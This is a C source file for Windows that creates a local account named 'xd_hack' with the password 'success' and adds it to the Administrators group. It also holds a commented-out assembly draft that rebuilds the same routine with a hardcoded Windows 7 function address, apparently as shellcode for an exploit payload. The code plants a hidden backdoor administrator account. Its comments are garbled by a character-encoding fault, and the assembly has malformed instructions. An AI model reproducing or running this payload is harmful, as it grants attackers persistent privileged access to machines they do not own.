#ifndef UNICODE
#define UNICODE
#endif
#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include <lm.h>
#pragma comment(lib,"netapi32")

int main()
{
       USER_INFO_1 ui;
	   DWORD dwError = 0;
       ui.usri1_name =L"xd_hack";
       ui.usri1_password =L"success";
	   ui.usri1_password_age=0;
       ui.usri1_priv = USER_PRIV_USER;//
       ui.usri1_home_dir = NULL;//
       ui.usri1_comment = NULL;
       ui.usri1_flags = UF_SCRIPT;//
       ui.usri1_script_path = NULL;
	   
       //������Ϊxd_hack���û�������ҲΪsuccess
       if(NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
       {
              //���ӳɹ�
              printf("Add user success.\n");
       }
       else
       {
              //����ʧ��
              printf("Add user Error!\n");
              return 1;
       }

       //��ww0830���ӵ�Administrators��
       if(NetLocalGroupAddMembers(NULL,L"Administrators",3,(&ui.usri1_name),1)== NERR_Success )
       {
              //���ӳɹ�
              printf("Add to Administrators success.\n");
              return 0;
       }
       else
       {
              //����ʧ��
              printf("Add to Administrators Fail!\n");
              return 1;
       }   
}

void addAdministrator()
{
       USER_INFO_1 ui;
       WCHAR user[]=L"xd_hack";
	   WCHAR pass[]=L"success";
	   WCHAR admin_group[]=L"Administrators";
	   DWORD dwError = 0;
       ui.usri1_name =user;
       ui.usri1_password =pass;
       ui.usri1_priv = USER_PRIV_USER;
       ui.usri1_home_dir = NULL;
       ui.usri1_comment = NULL;
       ui.usri1_flags = UF_SCRIPT;
       ui.usri1_script_path = NULL;
       //������Ϊxd_hack���û�������ҲΪsuccess
       NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
       //���ӵ�Administrators��
       NetLocalGroupAddMembers(NULL,admin_group,3,(&ui.usri1_name),1);
}
/*
void addAdministratorByASM()
{
	__asm
	{
		push ebp
		mov ebp,esp
		xor eax,eax
		//DWORD dwError = 0;
		mov DWORD ptr [ebp-04h],eax	//dwError

	    //WCHAR admin_group[]=L"Administrators";
		mov byte ptr [ebp-05h],eax	//0
		mov byte ptr [ebp-06h],eax	//0
		mov byte ptr [ebp-07h],eax		
		mov byte ptr [ebp-08h],//s
		mov byte ptr [ebp-09h],eax		
		mov byte ptr [ebp-0ah],//r
		mov byte ptr [ebp-0bh],eax		
		mov byte ptr [ebp-0ch],//o
		mov byte ptr [ebp-0dh],eax		
		mov byte ptr [ebp-0eh],//t
		mov byte ptr [ebp-0fh],eax		
		mov byte ptr [ebp-10h],//a
		mov byte ptr [ebp-11h],eax		
		mov byte ptr [ebp-12h],//r
		mov byte ptr [ebp-13h],eax		
		mov byte ptr [ebp-14h],//t
		mov byte ptr [ebp-15h],eax		
		mov byte ptr [ebp-16h],//s
		mov byte ptr [ebp-17h],eax		
		mov byte ptr [ebp-18h],//i
		mov byte ptr [ebp-19h],eax		
		mov byte ptr [ebp-1ah],//n
		mov byte ptr [ebp-1bh],eax		
		mov byte ptr [ebp-1ch],//i
		mov byte ptr [ebp-1dh],eax		
		mov byte ptr [ebp-1eh],//m
		mov byte ptr [ebp-1fh],eax		
		mov byte ptr [ebp-20h],//d
		mov byte ptr [ebp-21h],eax		
		mov byte ptr [ebp-22h],//A	

	    //WCHAR pass[]=L"success";
		mov byte ptr [ebp-23h],eax	//0
		mov byte ptr [ebp-24h],eax	//0
		mov byte ptr [ebp-25h],eax		
		mov byte ptr [ebp-26h],//s
		mov byte ptr [ebp-27h],eax		
		mov byte ptr [ebp-28h],//s
		mov byte ptr [ebp-29h],eax		
		mov byte ptr [ebp-2ah],//e
		mov byte ptr [ebp-2bh],eax		
		mov byte ptr [ebp-2ch],//c
		mov byte ptr [ebp-2dh],eax		
		mov byte ptr [ebp-2eh],//c
		mov byte ptr [ebp-2fh],eax		
		mov byte ptr [ebp-30h],//u
		mov byte ptr [ebp-31h],eax		
		mov byte ptr [ebp-32h],//s
		

        //WCHAR user[]=L"xd_hack";
		mov byte ptr [ebp-33h],eax	//0
		mov byte ptr [ebp-34h],eax	//0
		mov byte ptr [ebp-35h],eax		
		mov byte ptr [ebp-36h],//k
		mov byte ptr [ebp-37h],eax		
		mov byte ptr [ebp-38h],//c
		mov byte ptr [ebp-39h],eax		
		mov byte ptr [ebp-3ah],//a
		mov byte ptr [ebp-3bh],eax		
		mov byte ptr [ebp-3ch],//h
		mov byte ptr [ebp-3dh],eax		
		mov byte ptr [ebp-3eh],//_
		mov byte ptr [ebp-3fh],eax		
		mov byte ptr [ebp-40h],//d
		mov byte ptr [ebp-41h],eax		
		mov byte ptr [ebp-42h],//x
		

		//USER_INFO_1 ui;
		mov DWORD ptr [ebp-44h],0		//usri1_script_path
		mov DWORD ptr [ebp-48h],1		//usri1_flags
		mov DWORD ptr [ebp-44h],0		//usri1_comment
		mov DWORD ptr [ebp-4Ch],0		//usri1_home_dir
		mov DWORD ptr [ebp-50h],1		//usri1_priv
		mov DWORD ptr [ebp-54h],0		//usri1_password_age
		lea eax,[ebp-32h]
		mov DWORD ptr [ebp-58h],eax		//username
		lea eax,[ebp-42h]					
		mov DWORD ptr [ebp-5ch],eax		//password

		//call NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
		lea eax,[ebp-04h]	
		push eax
		lea ecx,[ebp-5ch]
		push ecx
		push 1
		push 0
		call 0x73dc464f				//NetUserAdd win7 0x73dc464f
	}
*/
/*
typedef struct _USER_INFO_1 {
    LPWSTR   usri1_name;
    LPWSTR   usri1_password;
    DWORD    usri1_password_age;
    DWORD    usri1_priv;
    LPWSTR   usri1_home_dir;
    LPWSTR   usri1_comment;
    DWORD    usri1_flags;
    LPWSTR   usri1_script_path;
}USER_INFO_1, *PUSER_INFO_1, *LPUSER_INFO_1;
*/